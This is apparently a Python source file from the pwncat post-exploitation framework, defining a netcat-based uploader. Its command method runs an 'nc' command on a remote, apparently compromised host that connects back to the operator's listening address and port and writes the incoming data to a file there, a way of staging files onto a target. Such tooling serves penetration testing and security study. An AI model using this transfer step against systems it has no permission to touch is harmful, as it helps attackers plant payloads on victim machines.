#!/usr/bin/env python3
from typing import Generator
import shlex

from pwncat.uploader.base import RawUploader


class NetcatUploader(RawUploader):

    NAME = "nc"
    BINARIES = ["nc"]

    def command(self) -> Generator[str, None, None]:
        """ Return the commands needed to trigger this download """

        lhost = self.pty.vars["lhost"]
        lport = self.server.server_address[1]
        nc = self.pty.which("nc", quote=True)
        remote_file = shlex.quote(self.remote_path)

        self.pty.run(f"{nc} {lhost} {lport} > {remote_file}", wait=False)
